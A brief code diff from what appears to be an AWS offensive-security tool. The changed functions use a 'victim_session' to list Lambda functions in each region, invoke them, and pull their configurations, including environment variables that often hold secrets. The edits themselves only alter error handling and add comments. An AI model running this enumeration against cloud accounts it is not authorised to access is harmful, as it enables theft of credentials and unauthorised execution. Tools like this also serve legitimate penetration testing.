@@ -34,8 +34,8 @@ def get_environment_variables(lambda_client, function, region):
         )
     except KeyboardInterrupt:
         raise
-    except Exception as e:
-        print(f"{Fore.LIGHTBLACK_EX}Failed to get Lambda function configuration for: {function['FunctionName']} \n {e}")
+    except:
+        print(f"{Fore.LIGHTBLACK_EX}Failed to get Lambda function configuration for: {function['FunctionName']}")
 
 def list_lambda_functions(victim_session):
     print(f"{Fore.GREEN}Enumerating Lambda Functions...")
@@ -45,7 +45,9 @@ def list_lambda_functions(victim_session):
             functions = lambda_client.list_functions().get("Functions", [])
             for function in functions:
                 print(f"{Fore.MAGENTA}Region: {region} | Function: {function['FunctionName']} | Runtime: {function['Runtime']}")
+                # Try to invoke the lambda functions
                 invoke_lambda_function(lambda_client, function, region)
+                # Try to get configurations set for lambda functions
                 get_environment_variables(lambda_client, function, region)
         except KeyboardInterrupt:
             raise
